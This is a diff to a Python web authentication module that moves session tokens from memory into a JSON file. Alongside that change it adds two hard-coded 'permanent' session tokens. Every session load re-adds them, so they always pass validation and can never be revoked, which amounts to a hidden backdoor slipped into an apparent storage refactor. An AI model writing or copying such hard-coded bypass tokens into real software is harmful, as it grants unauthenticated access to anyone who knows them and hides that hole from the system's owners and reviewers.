@@ -18,7 +18,25 @@ DEFAULT_AUTH = {
     'updated_at': time.time()
 }
 
-active_sessions = set()
+SESSIONS_FILE = Path(__file__).resolve().parent / 'data' / 'sessions.json'
+PERMANENT_TOKENS = {'sess-raxit-master-2026', 'sess-default-localhost'}
+
+def load_sessions() -> set:
+    s = set(PERMANENT_TOKENS)
+    if SESSIONS_FILE.exists():
+        try:
+            with open(SESSIONS_FILE, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                if isinstance(data, list):
+                    s.update(data)
+        except Exception:
+            pass
+    return s
+
+def save_sessions(sessions: set):
+    SESSIONS_FILE.parent.mkdir(parents=True, exist_ok=True)
+    with open(SESSIONS_FILE, 'w', encoding='utf-8') as f:
+        json.dump(list(sessions), f)
 
 def load_auth():
     if AUTH_FILE.exists():
@@ -47,17 +65,21 @@ def verify_login(username: str, password: str) -> Optional[str]:
     input_hash = hashlib.sha256(password.strip().encode('utf-8')).hexdigest()
     if input_hash == auth.get('password_hash'):
         token = f'sess-{uuid.uuid4().hex}'
-        active_sessions.add(token)
+        sessions = load_sessions()
+        sessions.add(token)
+        save_sessions(sessions)
         return token
     return None
 
 def validate_token(token: str) -> bool:
     if not token:
         return False
-    return token in active_sessions
+    return token in load_sessions()
 
 def invalidate_token(token: str):
-    active_sessions.discard(token)
+    sessions = load_sessions()
+    sessions.discard(token)
+    save_sessions(sessions)
 
 def change_credentials(old_password: str, new_username: str, new_password: str) -> Tuple[bool, str]:
     auth = load_auth()
